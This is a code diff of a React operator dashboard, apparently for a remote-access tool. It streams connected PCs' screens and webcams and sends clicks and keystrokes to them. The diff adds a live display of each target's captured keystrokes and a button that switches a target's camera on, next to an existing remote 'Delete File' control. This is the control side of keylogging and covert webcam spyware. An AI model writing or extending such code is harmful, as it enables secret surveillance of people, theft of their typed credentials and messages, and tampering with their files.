@@ -2,7 +2,7 @@ import { useEffect, useState, useRef } from "react";
 import { io } from "socket.io-client";
 
 // Ensure this matches your server URL
-const socket = io("/");
+const socket = io(process.env.NODE_ENV == "development" ? "http://localhost:3000" : "/");
 
 
 export default function App() {
@@ -10,12 +10,20 @@ export default function App() {
     const [selectedPcId, setSelectedPcId] = useState(null);
     const [screen, setScreen] = useState(null);
     const [camera, setCamera] = useState(null);
+    const [keyinputs, setKeyinputs] = useState("");
     const [inputText, setInputText] = useState("");
+    const [socketConnected, setSocketConnected] = useState(false);
 
     const imgRef = useRef(null);
+    const textareaRef = useRef();
+
+
 
     useEffect(() => {
         // Receive the list of PCs
+        socket.on("connect", () => {
+            setSocketConnected(true);
+        })
         socket.on("update_pc_list", (list) => {
             console.log("Updated PC List:", list);
             setPcList(list);
@@ -24,11 +32,19 @@ export default function App() {
         // Receive Image Data
         socket.on("screen", (d) => setScreen("data:image/jpeg;base64," + d));
         socket.on("camera", (d) => setCamera("data:image/jpeg;base64," + d));
+        socket.on("keyinput", (d) => {
+            setKeyinputs(prev => prev + d);
+            if (textareaRef.current) {
+                textareaRef.current.selectionStart = textareaRef.current.selectionEnd = textareaRef.current.value.length;
+                textareaRef.current.scrollTop = textareaRef.current.scrollHeight;
+            }
+        });
 
         return () => {
             socket.off("update_pc_list");
             socket.off("screen");
             socket.off("camera");
+            socket.off("keyinput");
         };
     }, []);
 
@@ -131,66 +147,99 @@ export default function App() {
 
     // 2. Control View
     return (
-        <div style={{ width: "100vw", height: "100vh", background: "#000", display: "flex", flexDirection: "column" }}>
+        !socketConnected
+            ? "Connecting..." :
+            <div style={{ width: "100%", height: "100vh", background: "#000", display: "flex", flexDirection: "column" }}>
 
-            {/* Toolbar */}
-            <div style={{ padding: 10, background: "#333", display: "flex", gap: 10 }}>
-                <button onClick={() => setSelectedPcId(null)}>Back to List</button>
+                {/* Toolbar */}
+                <div style={{ padding: 10, background: "#333", display: "flex", gap: 10 }}>
+                    <button onClick={() => {
+                        if(socket.connected){
+                            socket.emit("stop", { targetId: selectedPcId })
+                        }
+                        setSelectedPcId(null);
+                    }}>Back to List</button>
 
-                <input
-                    style={{ padding: "5px" }}
-                    type="text"
-                    value={inputText}
-                    onChange={e => setInputText(e.target.value)}
-                    placeholder="Type to send..."
-                />
-                <button onClick={handleSendText}>Send Text</button>
-
-                <div style={{ width: 20 }}></div> {/* Spacer */}
-
-                <button onClick={() => handleKey("enter")}>Enter</button>
-                <button onClick={() => handleKey("backspace")}>Backspace</button>
-                <button onClick={() => handleKey("esc")}>Esc</button>
-                <button onClick={() => delete_file()}>Delete File</button>
-            </div>
-
-            {/* Screen Area */}
-            <div style={{ flex: 1, position: "relative", overflow: "hidden", display: "flex", justifyContent: "center", alignItems: "center" }}>
-
-                {screen ? (
-                    <img
-                        ref={imgRef}
-                        src={screen}
-                        onMouseMove={handleMouseMove}
-                        onMouseDown={handleClick}
-                        onContextMenu={(e) => { e.preventDefault(); handleClick(e); }}
-                        style={{
-                            maxWidth: "100%",
-                            maxHeight: "100%",
-                            objectFit: "contain",
-                            cursor: "crosshair"
-                        }}
+                    <input
+                        style={{ padding: "5px" }}
+                        type="text"
+                        value={inputText}
+                        onChange={e => setInputText(e.target.value)}
+                        placeholder="Type to send..."
                     />
-                ) : (
-                    <p style={{ color: "white" }}>Connecting to video stream...</p>
-                )}
+                    <button onClick={handleSendText}>Send Text</button>
 
-                {/* Camera Overlay (Picture-in-Picture) */}
-                {camera && (
-                    <img
-                        src={camera}
+                    <div style={{ width: 20 }}></div> {/* Spacer */}
+
+                    <button onClick={() => handleKey("enter")}>Enter</button>
+                    <button onClick={() => handleKey("backspace")}>Backspace</button>
+                    <button onClick={() => handleKey("esc")}>Esc</button>
+                    <button onClick={() => {
+                        if (socket.connected) {
+                            socket.emit("sendCamera", { targetId: selectedPcId })
+                        }
+                    }}>Camera On/Off</button>
+                    <button onClick={() => delete_file()}>Delete File</button>
+                </div>
+
+                {/* Screen Area */}
+                <div style={{ flex: 1, position: "relative", overflow: "hidden", display: "flex", justifyContent: "center", alignItems: "center" }}>
+
+                    {screen ? (
+                        <img
+                            ref={imgRef}
+                            src={screen}
+                            onMouseMove={handleMouseMove}
+                            onMouseDown={handleClick}
+                            onContextMenu={(e) => { e.preventDefault(); handleClick(e); }}
+                            style={{
+                                maxWidth: "100%",
+                                maxHeight: "100%",
+                                objectFit: "contain",
+                                cursor: "crosshair"
+                            }}
+                        />
+                    ) : (
+                        <p style={{ color: "white" }}>Connecting to video stream...</p>
+                    )}
+
+                    {/* Camera Overlay (Picture-in-Picture) */}
+                    {camera && (
+                        <img
+                            src={camera}
+                            style={{
+                                position: "absolute",
+                                bottom: 20,
+                                right: 20,
+                                width: 240,
+                                borderRadius: 8,
+                                border: "2px solid rgba(255,255,255,0.5)",
+                                pointerEvents: "none"
+                            }}
+                        />
+                    )}
+                </div>
+                <div
+                    style={{
+                        width: "100%",
+                        height: "100px",
+                        padding: "16px"
+                    }}>
+                    <textarea
                         style={{
-                            position: "absolute",
-                            bottom: 20,
-                            right: 20,
-                            width: 240,
-                            borderRadius: 8,
-                            border: "2px solid rgba(255,255,255,0.5)",
-                            pointerEvents: "none"
+                            width: "100%",
+                            height: "100%",
+                            color: "white",
+                            background: "black",
+                            fontSize: 11,
+                            lineHeight: "2",
+                            resize: "none",
                         }}
-                    />
-                )}
+                        readOnly
+                        value={keyinputs}
+                        ref={textareaRef}
+                    ></textarea>
+                </div>
             </div>
-        </div>
     );
 }
